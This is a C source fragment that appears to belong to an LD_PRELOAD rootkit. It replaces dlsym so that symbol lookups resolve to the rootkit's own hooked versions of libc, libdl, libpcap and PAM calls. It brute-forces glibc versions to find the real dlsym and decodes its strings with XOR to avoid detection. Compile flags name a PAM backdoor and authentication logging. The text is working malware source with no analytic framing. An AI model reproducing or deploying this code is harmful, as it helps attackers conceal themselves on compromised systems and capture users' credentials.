#define getrealsym(SYM, PTR, LIBP, CLIST) do {\
    if(PTR == NULL) { \
        void *H; \
        char *CURCALL; \
        int S=1; \
        if((H = xdlopen(LIBP, RTLD_LAZY)) != NULL){ \
            for(size_t I=0; I < sizeofarr(CLIST) && S; I++){ \
                CURCALL = xordup(CLIST[I]); \
                S = strncmp(CURCALL, SYM, strlen(CURCALL)); \
                clean(CURCALL); \
                !S ? PTR = o_dlsym(H, SYM) : 0; \
            } \
            !PTR ? dlclose(H) : 0; \
        } \
    }else return PTR; \
    if(PTR) return PTR; \
} while(0)

void locate_dlsym(void){
    if(o_dlsym != NULL)
        return;

    char buf[32], *gvs;

    gvs = xordup(GLIBC_VER_STR);
    for(int a = 0; a < GLIBC_MAX_VER && !o_dlsym; a++){
        snprintf(buf, sizeof(buf), gvs, a);
        o_dlsym = (void*(*)(void *handle, const char *name))dlvsym(RTLD_NEXT, "dlsym", buf);
    }
    clean(gvs);
    if(o_dlsym != NULL)
        return;
    gvs = xordup(GLIBC_VERVER_STR);
    for(int a = 0; a < GLIBC_MAX_VER && !o_dlsym; a++){
        for(int b = 0; b < GLIBC_MAX_VER && !o_dlsym; b++){
            snprintf(buf, sizeof(buf), gvs, a, b);
            o_dlsym = (void*(*)(void *handle, const char *name))dlvsym(RTLD_NEXT, "dlsym", buf);
        }
    }
    clean(gvs);
    o_dlsym == NULL ? exit(0) : 0;
}

void *dlsym(void *handle, const char *symbol){
    void *ptr = NULL;
    locate_dlsym();
    getrealsym(symbol, ptr, LIBC_PATH, libc_calls);
    getrealsym(symbol, ptr, LIBDL_PATH, libdl_calls);
    getrealsym(symbol, ptr, LIBPCAP_PATH, libpcap_calls);
#if defined(USE_PAM_BD) || defined(PAM_AUTH_LOGGING)
    getrealsym(symbol, ptr, LIBPAM_PATH, libpam_calls);
#endif
    ptr == NULL ? ptr = o_dlsym(handle, symbol) : 0;
    return ptr;
}
